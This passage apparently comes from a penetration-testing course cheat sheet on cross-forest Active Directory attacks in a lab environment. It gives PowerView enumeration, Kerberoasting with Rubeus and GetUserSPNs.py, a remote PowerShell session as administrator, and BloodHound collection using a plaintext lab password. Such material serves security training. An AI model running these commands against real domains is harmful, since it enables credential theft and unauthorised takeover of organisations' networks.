Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc | select samaccountname,memberof
```
PowerView tool used to enumerate the `mssqlsvc` account from a Windows-based host.

#### Performing a Kerberoasting Attacking with Rubeus Using /domain Flag
```PowerShell
.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
```
Uses `Rubeus` to perform a Kerberoasting Attack against a target Windows domain (`/domain:FREIGHTLOGISTICS.local`) from a Windows-based host.

### Admin Password Re-Use & Group Membership

#### Using Get-DomainForeignGroupMember
```PowerShell
Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
```
PowerView tool used to enumerate groups with users that do not belong to the domain from a Windows-based host.

#### Accessing DC03 Using Enter-PSSession
```PowerShell
Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator
```
PowerShell cmd-let used to remotely connect to a target Windows system from a Windows-based host.

### Cross-Forest Kerberoasting - Linux

#### Using GetUserSPNs.py w/ the -request Flag
```Shell
GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
```
Impacket tool used to request (`-request`) the TGS ticket of an account in a target Windows domain (`-target-domain`) from a Linux-based host.

### Hunting Foreign Group Membership with Bloodhound-python

#### Adding INLANEFREIGHT.LOCAL Information to /etc/resolv.conf
```Shell
cat /etc/resolv.conf 
#nameserver 1.1.1.1
#nameserver 8.8.8.8
domain INLANEFREIGHT.LOCAL
nameserver 172.16.5.5
```
Checks to ensure the target domain is in the `/etc/resolv.conf` file

#### Running bloodhound-python Against INLANEFREIGHT.LOCAL
```Shell
bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2
```
Runs the Python implementation of `BloodHound` against a target Windows domain from a Linux-based host.

#### Compressing the File with zip -r
```Shell
zip -r ilfreight_bh.zip *.json
```
Used to compress multiple files into 1 single `.zip` file to be uploaded into the BloodHound GUI.

#### Adding FREIGHTLOGISTICS.LOCAL Information to /etc/resolv.conf
```Shell
cat /etc/resolv.conf 
#nameserver 1.1.1.1
#nameserver 8.8.8.8
domain FREIGHTLOGISTICS.LOCAL
nameserver 172.16.5.238
```

#### Running bloodhound-python Against FREIGHTLOGISTICS.LOCAL
```Shell
bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2
```
